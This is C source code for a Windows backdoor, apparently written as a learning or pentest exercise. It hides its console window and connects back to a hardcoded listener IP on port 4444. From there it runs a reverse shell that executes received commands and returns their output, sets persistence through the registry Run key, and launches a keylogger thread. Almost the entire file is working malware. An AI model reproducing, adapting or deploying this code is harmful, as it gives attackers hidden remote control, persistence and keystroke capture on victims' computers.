//include libraries for Windows-specific programming
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
//include library for keylogger in backdoor
#include "keylogger.h"//keylogger file in same directory

/*********FUNCTIONS DECLARED FOR MAIN***********/
#define bzero(p, size) (void) memset((p), 0, (size))
int sock;

int bootRun(){
	char err[128] = "Failed\n";
	char suc[128] = "Created persistence at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];//on Win10, max path limit is 256 characters
	DWORD pathLen = 0;

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0){
		send(sock, err, sizeof(err),0);
		return -1;
	}
	HKEY NewVal;
	if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	DWORD pathLenInBytes = pathLen * sizeof(*szPath);
	if (RegSetValueEx(NewVal, TEXT("Hacked"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS){
		RegCloseKey(NewVal);
		send(sock, err, sizeof(err), 0);
		return -1;
	}
	RegCloseKey(NewVal);
	send(sock, suc, sizeof(suc), 0);
	return 0;
}//function to establish persistence

char *str_cut(char str[], int slice_from, int slice_to){
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;

                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}//function for buffer/sting blankspace i.e. enter "cd .."

void Shell(){
	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while (1){
		jump:
		bzero(buffer, 1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0);

		if (strncmp("q", buffer, 1) == 0){
			closesocket(sock);
			WSACleanup();
			exit(0);
		}//indicate to quit/close prog
		else if (strncmp("cd ", buffer, 3) == 0){
			chdir(str_cut(buffer, 3, 100));
		}//change directory
		else if (strncmp("persist",buffer, 7) == 0){
			bootRun();
		}//persistence via registry
		else if (strncmp("keylog_start", buffer, 12) == 0){
			HANDLE thread = CreateThread(NULL, 0, logg, NULL, 0, NULL);
			goto jump;
		}//keylogger
		else{
			FILE *fp;
			fp = _popen(buffer, "r");//read buffer and execute cmd
			while (fgets(container, 1024, fp) != NULL){
				strcat(total_response, container);
			}//end WHILE
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}//end ELSE
	}//end WHILE
}//really the core part of prog; the remote shell

/***********************************************/
/*
windows main function
needs to return integer and entry point is always MAIN, needs API to access different functions
HINSTANCE is handle to instance/module, OS uses this value to id executable when loaded in mem
INSTANCE handle also needed for Win functions
PREV used in 16-bit windows, now is zero
CMD line contains cmd line argument like unicode string
CmdShow is flag: whether main app window is min, max or normal <-- critical for malware!! does not show.
*/
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

	//part of program that hides console
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);

	//next need to create socket
	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;//contains info about Win sockets

	//need to update these as DHCP/port assignments can vary per environment
	ServIP = "192.168.0.30";//IP addr of local/host machine; listener
	ServPort = 4444;//any free, existing port

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0){
		exit(1);
	}//end IF

	//create socket
	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));//clears variable by making zeroes
	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
		Sleep(10);
		goto start;
	}//end WHILE

	//optional notification that user is hacked i.e. for pentests
	MessageBox(NULL, TEXT("Your device has been hacked!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);

	Shell();//recieve cmds from Server, execute and send back output/results
}//end MAIN
